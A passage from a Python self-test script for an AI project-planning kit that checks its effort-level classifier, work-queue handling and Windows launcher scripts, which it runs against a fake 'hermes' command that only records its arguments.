    # the auto-start chain (new_project.cmd -> setup_project.py -> .hermes/START_PROMPT.md) had no check at all: the plan is staged by FILES
    S = work / "setup_d1"
    S.mkdir()
    rcS, outS = sh([sys.executable, "-B", str(KIT / "setup_project.py"), str(S), "setup_d1"], cwd=S)
    spp = S / ".hermes" / "START_PROMPT.md"
    spt = spp.read_text(encoding="utf-8") if spp.exists() else ""
    check("setup_project.py: START_PROMPT stages the plan by files (empty IDEA -> one question; no QUESTIONNAIRE -> STAGE 1 and STOP; plan only after AUTHOR_ANSWERS)",
          rcS == 0 and "DONE." in outS and "3. Otherwise plan in KIT MODE" not in spt
          and all(s in spt for s in ("ask the owner ONE question", "no QUESTIONNAIRE_*.md yet -> STAGE 1", "never edit IDEA.md. STOP",
                                     "-> STOP and list the open questions; do NOT edit QUESTIONNAIRE_*.md", "-> STAGE 2: plan in KIT MODE",
                                     "your own choices are INFERRED", "FIRST record the letters as typed", "(stage 2 only) Write the first cards",
                                     "in the language of the owner's sentences", "not of its template header",
                                     "4. (stage 2 only) EFFORT GATE, before ANY plan file or card", "double-click START_ARCHITECT.cmd again", "ladder: none < minimal < low < medium < high < xhigh < max < ultra", "type `/reasoning <level>` and then send `Session effort: <level>`", "A later owner message with a `Session effort:` line replaces")),
          (rcS, outS[-200:], spt[:160]))

    # ---- 2.8.0 effort ladder: tools/effort.py (read-only classifier of the project files) + START_ARCHITECT.cmd / START_WORKER.cmd (the only place the kit owns a launch)
    EFD = new_project(work, "effort")
    eff = lambda *a, p=EFD: sh([sys.executable, "-I", "-B", "tools/effort.py", *a], cwd=p)
    epl = EFD / ".hermes/plans"
    (epl / "cards").mkdir(parents=True, exist_ok=True)
    seen = set()   # every rule id the tool printed in the checks below: each must be in PLAYBOOK section 12

    def eline(*a, p=EFD):
        rc_, o_ = eff(*a, p=p)
        o_ = o_.strip()
        if o_.split()[1:3] in (["ultra", "architect"], ["ultra", "worker"], ["medium", "architect"], ["medium", "worker"], ["max", "architect"], ["max", "worker"]):
            seen.add(o_.split()[3])
        return rc_, o_

    def put(rel, text, mode="w"):
        with open(EFD / rel, mode, encoding="utf-8", newline="") as fh:
            fh.write(text)
    ROTE_BIG_STEPS = LINT_CARD_ROTE.replace("| 2 | `python3 -c \"print(1)\" | tail -1` | `1` |\n", "".join(f"| {i} | `echo {i}` | `{i}` |\n" for i in range(2, 12)))
    ROTE_BIG_BYTES = LINT_CARD_ROTE.replace("x = 1\nEOF", "x = 1\n" * 700 + "EOF")
    ROTE_BIG_OWNS = LINT_CARD_ROTE.replace("- src/a.py\n", "- src/a.py\n- src/b.py\n- src/c.py\n- src/d.py\n- src/e.py\n")
    st = [eline("stage")]
    put(".hermes/plans/AUTHOR_ANSWERS_2026-11-08.md", "answers\n")
    st.append(eline("stage"))
    put(".hermes/plans/cards/T-050.md", LINT_CARD_ROTE)
    st.append(eline("stage"))
    put(".hermes/plans/WORKLOG.md", "\n## T-050 | 2026-11-08T10:00:00+0200 | FAIL | probe\nfiles: none\nfor author/architect: Q-001\n", "a")
    put(".hermes/plans/QUESTIONS.md", "\n## Q-001 | 2026-11-08T10:00:01+0200 | OPEN\n> why?\n", "a")
    st.append(eline("stage"))
    put(".hermes/plans/QUESTIONS.md", "ANSWER Q-001 2026-11-08 fixed\n", "a")
    st.append(eline("stage"))
    put(".hermes/plans/cards/SPEC-050.md", LINT_CARD_SPEC)
    st.append(eline("stage"))
    want = [("medium", "E4"), ("ultra", "E2"), ("medium", "E4"), ("ultra", "E1"), ("medium", "E4"), ("ultra", "E3")]
    check("effort.py stage by the files: fresh E4 medium -> answers and no card E2 ultra -> a card E4 -> newest WORKLOG FAIL with its question open E1 ultra -> ANSWER line E4 -> open SPEC card E3 ultra",
          [(rc_ == 0 and o_.startswith(f"EFFORT {lv} architect {rl} ")) for (rc_, o_), (lv, rl) in zip(st, want)] == [True] * 6, st)
    for nm, body in (("T-051", ROTE_BIG_STEPS), ("T-052", ROTE_BIG_BYTES), ("T-053", ROTE_BIG_OWNS), ("T-055", LINT_CARD_ROTE),
                     ("T-054", LINT_CARD_ROTE.replace("Author decisions needed: none\n", "Author decisions needed: none\nSupersedes: T-050\n", 1))):
        put(f".hermes/plans/cards/{nm}.md", body)
    kenv = (EFD / "tools/kit.env").read_text(encoding="utf-8")
    cd = {c_: eline("card", c_) for c_ in ("T-055", "SPEC-050")}   # kit.env as shipped: EFFORT_WORKER=ultra
    put("tools/kit.env", kenv.replace("EFFORT_WORKER=ultra", "EFFORT_WORKER=auto"), "w")
    ca = {c_: eline("card", c_) for c_ in ("T-055", "SPEC-050", "T-051", "T-052", "T-053", "T-054", "T-050")}
    check("effort.py card: shipped kit.env = W5 ultra for every worker card, a SPEC card W1 ultra; EFFORT_WORKER=auto = W4 medium for a small card, W3 ultra on steps>=10, on fenced>=4000 B and on OWNS>=5, W2 ultra for a card that supersedes a FAILED one (or is one)",
          cd["T-055"][1].startswith("EFFORT ultra worker W5 ") and cd["SPEC-050"][1].startswith("EFFORT ultra worker W1 ")
          and ca["T-055"][1].startswith("EFFORT medium worker W4 ") and ca["SPEC-050"][1].startswith("EFFORT ultra worker W1 ")
          and all(ca[c_][1].startswith("EFFORT ultra worker W3 ") for c_ in ("T-051", "T-052", "T-053"))
          and all(ca[c_][1].startswith("EFFORT ultra worker W2 ") for c_ in ("T-054", "T-050")), (cd, ca))
    put("tools/kit.env", kenv.replace("EFFORT_DEFAULT=medium", "EFFORT_DEFAULT=high").replace("EFFORT_HARD=ultra", "EFFORT_HARD=max"), "w")
    ov = [eline("stage"), eline("card", "SPEC-050")]
    ovl = eff("stage", "--level")
    put("tools/kit.env", kenv.replace("EFFORT_DEFAULT=medium", "EFFORT_DEFAULT=turbo"), "w")
    bad_ = eline("stage")
    put("tools/kit.env", kenv.replace("EFFORT_DEFAULT=medium", "EFFORT_DEFAULT=ultra").replace("EFFORT_HARD=ultra", "EFFORT_HARD=low"), "w")
    bad2 = eline("stage")
    put("tools/kit.env", kenv, "w")
    check("effort.py levels come from tools/kit.env (EFFORT_DEFAULT=high, EFFORT_HARD=max -> E4 high, E3 max); a bad value or DEFAULT above HARD is ignored AND said; --level prints the level only",
          ov[0][1].startswith("EFFORT max architect E3 ") and ov[1][1].startswith("EFFORT max worker W1 ") and ovl == (0, "max\n")
          and bad_[1].startswith("EFFORT ultra architect E3 ") and "ignored" in bad_[1] and "EFFORT_DEFAULT=turbo" in bad_[1]
          and "ignored" in bad2[1] and "EFFORT_DEFAULT=ultra EFFORT_HARD=low" in bad2[1], (ov, ovl, bad_, bad2))
    for f_ in ("SPEC-050", "T-051", "T-052", "T-053", "T-054", "T-050"):    # leave ONE small open card, so the queue below is the only thing that matters
        (epl / "cards" / f"{f_}.md").unlink()
    qblock = "ROLE: [HERMES EXECUTION ENGINE]. Отговаряй на български.\nRun rows 1..2 of .hermes/plans/cards/QUEUE_2026-11-08.md in order.\nLast line: QUEUE DONE <n PASS> / <n FAIL> / <n STOP>"
    put(".hermes/plans/cards/T-051.md", ROTE_BIG_STEPS)
    put("tools/kit.env", kenv.replace("EFFORT_WORKER=ultra", "EFFORT_WORKER=auto"), "w")
    put(".hermes/plans/cards/QUEUE_2026-11-08.md", "# QUEUE 2026-11-08 - effort\nChain: base=3 | T-055:+0 T-051:+0 | final=3\n\n## START BLOCK (paste once)\n```\n" + qblock + "\n```\nReturn line.\n")
    snap_t = lambda: {x.relative_to(EFD).as_posix(): x.read_bytes() for x in EFD.rglob("*") if x.is_file() and ".git" not in x.parts}
    t_before = snap_t()
    q1 = eline("queue")
    q1l = eff("queue", "--level")
    t_after = snap_t()
    put(".hermes/plans/WORKLOG.md", "\n## T-051 | 2026-11-08T10:05:00+0200 | PASS | probe\nfiles: none\ndeviations: none\nfor author/architect: none\n", "a")
    q2 = eline("queue")
    blk = EFD / "worker_block.txt"
    rcb, ob = eff("block", "--out", str(blk))
    put(".hermes/plans/WORKLOG.md", "\n## T-055 | 2026-11-08T10:06:00+0200 | PASS | probe\nfiles: none\ndeviations: none\nfor author/architect: none\n", "a")
    q3 = eline("queue")
    q3l = eff("queue", "--level")
    rcn, on = eff("block", "--out", str(EFD / "never.txt"))
    check("effort.py queue: the hardest card of the newest queue that still has cards without a WORKLOG entry (W3 ultra, then W4 medium after T-051 has an entry), exit 3 + 'EFFORT none' when all have one (--level prints nothing), and it wrote nothing",
          q1[0] == 0 and q1[1].startswith("EFFORT ultra worker W3 queue QUEUE_2026-11-08.md, 2 card(s), hardest T-051") and q1l == (0, "ultra\n")
          and t_before == t_after and q2[1].startswith("EFFORT medium worker W4 queue QUEUE_2026-11-08.md, 1 card(s), hardest T-055")
          and q3[0] == 3 and q3[1].startswith("EFFORT none - QUEUE_2026-11-08.md: all 2 cards already have a WORKLOG entry") and q3l == (3, "\n"), (q1, q1l, q2, q3, q3l))
    check("effort.py block --out FILE writes exactly the START BLOCK of the queue (UTF-8, LF, Cyrillic intact) and nothing else; exit 3 when nothing is left to run",
          rcb == 0 and blk.is_file() and blk.read_bytes() == (qblock + "\n").encode("utf-8") and rcn == 3 and not (EFD / "never.txt").exists(), (rcb, ob, rcn, on))
    put("tools/kit.env", kenv, "w")
    pb12 = (KIT / "payload/.hermes/plans/PLAYBOOK.md").read_text(encoding="utf-8").split("## 12.", 1)[-1]
    envk = (KIT / "payload/tools/kit.env").read_text(encoding="utf-8")
    want_ids = {"E1", "E2", "E3", "E4", "W1", "W2", "W3", "W4", "W5"}
    check("PLAYBOOK section 12 names every rule id effort.py printed above (E1-E4, W1-W5) and the shipped kit.env sets EFFORT_DEFAULT=medium, EFFORT_HARD=ultra, EFFORT_WORKER=ultra",
          seen == want_ids and all(re.search(rf"\b{r_}\b", pb12) for r_ in want_ids) and all(f"\n{k_}={v_}\n" in envk for k_, v_ in (("EFFORT_DEFAULT", "medium"), ("EFFORT_HARD", "ultra"), ("EFFORT_WORKER", "ultra"))),
          (sorted(seen), pb12[:80]))
    swl = S / "START_WORKER.cmd"
    check("effort.py installs as ENGINE (byte-identical to the payload) and setup_project.py puts START_WORKER.cmd next to START_ARCHITECT.cmd (byte-identical to the kit's launchers)",
          (EFD / "tools/effort.py").is_file() and (KIT / "payload/tools/effort.py").is_file() and (EFD / "tools/effort.py").read_bytes() == (KIT / "payload/tools/effort.py").read_bytes() and (S / "tools/effort.py").is_file()
          and swl.is_file() and (KIT / "start_worker.cmd").is_file() and swl.read_bytes() == (KIT / "start_worker.cmd").read_bytes() and (S / "START_ARCHITECT.cmd").read_bytes() == (KIT / "start_architect.cmd").read_bytes(), swl.is_file())
    # the launchers, run by the real cmd.exe with a fake `hermes` that records its arguments (no model, no network)
    fbin = work / "fakebin"
    fbin.mkdir(exist_ok=True)
    (fbin / "hermes.cmd").write_bytes(b'@echo off\r\n>"%AW_FAKE_OUT%" echo %*\r\n:loop\r\nif "%~1"=="" goto done\r\nif /i "%~1"=="--query-file" copy /y "%~2" "%AW_FAKE_OUT%.query" >nul\r\nshift\r\ngoto loop\r\n:done\r\n')
    path_ = str(fbin) + os.pathsep + str(Path(sys.executable).parent) + os.pathsep + os.environ.get("PATH", "")
    if os.name != "nt" or not (shutil.which("python", path=path_) or shutil.which("py", path=path_)):
        skip("START_ARCHITECT.cmd / START_WORKER.cmd with a fake hermes", "needs Windows cmd.exe and a `python` or `py` on PATH")
    else:
        LP2 = new_project(work, "launch")
        for nm_ in ("start_architect.cmd", "start_worker.cmd"):
            if (KIT / nm_).is_file():
                shutil.copy(KIT / nm_, LP2 / nm_.upper().replace(".CMD", ".cmd"))
        (LP2 / ".hermes/plans/cards").mkdir(parents=True, exist_ok=True)
        fout = work / "fake_out.txt"
        ltmp = work / "launcher_tmp"
        ltmp.mkdir(exist_ok=True)   # the launchers get their own TEMP: a temp file they leave behind is a finding, and the real %TEMP% stays clean

        def launch(name, extra=None):
            for f_ in (fout, Path(str(fout) + ".query")):
                if f_.exists():
                    f_.unlink()
            e_ = {k_: v_ for k_, v_ in os.environ.items() if not k_.startswith("AW_")}
            e_.update({"PATH": path_, "AW_FAKE_OUT": str(fout), "TEMP": str(ltmp), "TMP": str(ltmp)})
            e_.update(extra or {})
            r_ = subprocess.run(["cmd", "/c", name], cwd=str(LP2), env=e_, stdin=subprocess.DEVNULL, capture_output=True, text=True, encoding="utf-8", errors="replace", timeout=120)
            q_ = Path(str(fout) + ".query")
            return (fout.read_text(encoding="utf-8", errors="replace").strip() if fout.exists() else None,
                    q_.read_text(encoding="utf-8", errors="replace").replace("\r\n", "\n").strip() if q_.exists() else None, (r_.stdout + r_.stderr))
        a1 = launch("START_ARCHITECT.cmd")[0]
        (LP2 / ".hermes/plans/AUTHOR_ANSWERS_2026-11-08.md").write_text("answers\n", encoding="utf-8", newline="")
        a2 = launch("START_ARCHITECT.cmd")[0]
        a3 = launch("START_ARCHITECT.cmd", {"AW_ARCH_EFFORT": "high"})[0]
        if (LP2 / "tools/effort.py").is_file():
            (LP2 / "tools/effort.py").rename(LP2 / "tools/effort.py.off")
        a4 = launch("START_ARCHITECT.cmd")[0]
        if (LP2 / "tools/effort.py.off").is_file():
            (LP2 / "tools/effort.py.off").rename(LP2 / "tools/effort.py")
        check("START_ARCHITECT.cmd (real cmd.exe, fake hermes): `chat --reasoning medium` + 'Session effort: medium.' on a fresh project, ultra once the answers are recorded, AW_ARCH_EFFORT wins, no tools\\effort.py = no flag and the first task unchanged",
              a1 and a2 and a3 and a4 and " chat --reasoning medium --in " in a1 and a1.endswith('do what it says. Session effort: medium."')
              and " chat --reasoning ultra --in " in a2 and a2.endswith('Session effort: ultra."') and " chat --reasoning high --in " in a3
              and "--reasoning" not in a4 and "Session effort" not in a4 and a4.endswith('do what it says."') and a1.startswith("-p architect -m claude-sonnet-5-5 --provider anthropic chat"), (a1, a2, a3, a4))
        put_l = lambda rel, text, mode="w": open(LP2 / rel, mode, encoding="utf-8", newline="").write(text)
        put_l(".hermes/plans/cards/T-050.md", LINT_CARD_ROTE)
        put_l(".hermes/plans/cards/QUEUE_2026-11-08.md", "# QUEUE 2026-11-08 - launch\nChain: base=3 | T-050:+0 | final=3\n\n## START BLOCK (paste once)\n```\n" + qblock + "\n```\nReturn line.\n")
        w1 = launch("START_WORKER.cmd")
        kenv2 = (LP2 / "tools/kit.env").read_text(encoding="utf-8")
        put_l("tools/kit.env", kenv2.replace("EFFORT_WORKER=ultra", "EFFORT_WORKER=auto"))
        w2 = launch("START_WORKER.cmd")[0]
        w3 = launch("START_WORKER.cmd", {"AW_WORKER_EFFORT": "high", "AW_WORKER_PROFILE": "other-worker"})[0]
        put_l(".hermes/plans/WORKLOG.md", "\n## T-050 | 2026-11-08T10:00:00+0200 | PASS | probe\nfiles: none\n", "a")
        w4 = launch("START_WORKER.cmd")
        check("START_WORKER.cmd (real cmd.exe, fake hermes.cmd): `-p worker chat --reasoning ultra` and the query file is exactly the START BLOCK; EFFORT_WORKER=auto = medium; env overrides win; no open queue = no hermes call and the reason on screen; the temp file is deleted after the run (hermes called with `call`, so control comes back even when it is a .cmd)",
              w1[0] and w1[0].startswith("-p worker chat --reasoning ultra --in ") and w1[1] == qblock and w2 and " chat --reasoning medium --in " in w2
              and w3 and w3.startswith("-p other-worker chat --reasoning high --in ")
              and w4[0] is None and "all 1 cards already have a WORKLOG entry" in w4[2] and not list(ltmp.glob("aw_worker_*")), (w1, w2, w3, w4, sorted(p_.name for p_ in ltmp.iterdir())))

    section_gaps(work)
    section_gaps2(work)
    section_gaps3(work)
    section_gaps_mod1(work)
    section_gaps_mod2(work)
    section_gaps4(work)
    section_gaps5(work)
    section_gaps_mod3(work)
    section_shape(work)
    section_upgrade(work)
    section_learn(work)
    section_lint(work)

    # ---- every pristine check must still exist (allowing a documented rename)
    missing = [n for n in PRISTINE_NAMES if n not in checks and n not in skips]
    check("all 34 pristine checks still exist", not missing, missing)
    return finish(t0, scratch)


def rm_scratch(path) -> None:
    """Best effort, never changes the verdict. Clears the read-only bit first: a copy of a folder that holds desktop.ini keeps it on Windows."""
    def fix(fn, p, *_):
        os.chmod(p, 0o700)
        fn(p)
    try:
        shutil.rmtree(path, **{"onexc" if sys.version_info >= (3, 12) else "onerror": fix})
    except Exception:
        pass


def finish(t0: float, scratch=None) -> int:
    print(f"\nSELFTEST {'PASS' if not fails else 'FAIL'}  failures={len(fails)}  checks={len(checks)}  skipped={len(skips)}  "
          f"seconds={time.time() - t0:.1f}")
    if skips:
        print("SKIPPED (UNMEASURED, not failures): " + "; ".join(skips))
    if scratch is not None and not fails:   # a PASS leaves nothing in %TEMP% (about 2.7 MB a run); a FAIL keeps the dir to read
        rm_scratch(scratch)
    return 1 if fails else 0


if __name__ == "__main__":
    sys.exit(main())
